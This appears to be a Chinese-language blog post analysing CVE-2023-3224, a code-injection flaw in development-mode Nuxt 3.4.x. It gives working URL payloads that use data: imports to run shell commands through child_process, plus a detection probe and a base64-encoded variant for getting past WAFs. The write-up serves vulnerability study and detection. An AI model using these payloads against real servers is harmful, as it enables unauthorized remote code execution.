#  Nuxt开发模式下远程代码执行漏洞(CVE-2023-3224)

[ Medi0cr1ty ](javascript:void\(0\);)

**Medi0cr1ty** ![]()

微信号 Medi0cr1ty

功能介绍 宁静在遥远处波动

____

___发表于_

收录于合集

#漏洞 1 个

#nodejs 1 个

漏洞很简单，仅进行部分补充及记录

 **01**

漏洞概述

Nuxt在当服务端以开发模式启动时存在代码注入漏洞，远程未授权攻击者可利用此漏洞注入恶意代码并获取目标服务器权限。

前置条件：服务端以开发模式启动。

影响版本：Nuxt 3.4.0；3.4.1；3.4.2

 **02**

漏洞分析

环境搭建（三步）：

1、初始化

  * 

    
    
    npm init -y

2、依赖安装

  * 

    
    
    npm install nuxt@3.4.0

3、启动

  * 

    
    
    npx nuxi dev

根据漏洞补丁可知，漏洞触发点在 nuxt-root.vue 对 /__nuxt_component_test__/ 开头的 URL进行处理，交由 test-
component-wrapper.mjs ，在这里根据 query 中 path 参数值进行动态引入，导致可注入任意代码。

POC：  

  * 

    
    
    /__nuxt_component_test__/?path=data%3atext/javascript,console.log("test!");

![](https://gitee.com/fuli009/images/raw/master/public/20230714175621.png)

RCE：

  * 

    
    
    /__nuxt_component_test__/?path=data%3atext/javascript,(await%20import('child_process')).execSync('calc')

![](https://gitee.com/fuli009/images/raw/master/public/20230714175623.png)

RCE + 回显：

  * 

    
    
    /__nuxt_component_test__/?path=data%3atext/javascript,throw%20new%20Error((await%20import('child_process')).execSync('whoami'));

![](https://gitee.com/fuli009/images/raw/master/public/20230714175624.png)

 **03**

漏洞检测

  

  * 

    
    
    /__nuxt_component_test__/?path=data%3atext/javascript,throw%20new%20Error(Buffer.from(%22medi0crity%22).toString(%27base64%27));

![](https://gitee.com/fuli009/images/raw/master/public/20230714175625.png)

  

另：均可进行编码绕 WAF 等，如：  

  * 

    
    
    /__nuxt_component_test__/?path=data%3atext/javascript%3bcharset%3dutf-8%3bbase64,KGF3YWl0IGltcG9ydCgnY2hpbGRfcHJvY2VzcycpKS5leGVjU3luYygnY2FsYycp

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

